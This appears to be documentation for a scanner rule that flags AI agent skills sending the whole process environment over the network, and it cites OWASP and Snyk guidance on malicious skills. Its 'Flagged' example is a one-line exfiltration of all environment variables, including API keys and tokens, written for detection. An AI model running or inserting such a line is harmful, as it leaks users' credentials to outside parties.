# env-to-network

Severity: critical. OWASP Agentic Skills Top 10: AST01.

The whole environment is sent over the network.

The whole environment, which usually holds API keys and tokens, is serialized and sent somewhere.

## Flagged

```text
requests.post(url, data=json.dumps(dict(os.environ)))
```

## Not flagged

```text
subprocess.run(cmd, env={**os.environ, 'LANG': 'C'})   # passed to a child process, not sent
```

## Why it matters

See https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/ and the OWASP Agentic Skills Top 10 (https://owasp.org/www-project-agentic-skills-top-10/).
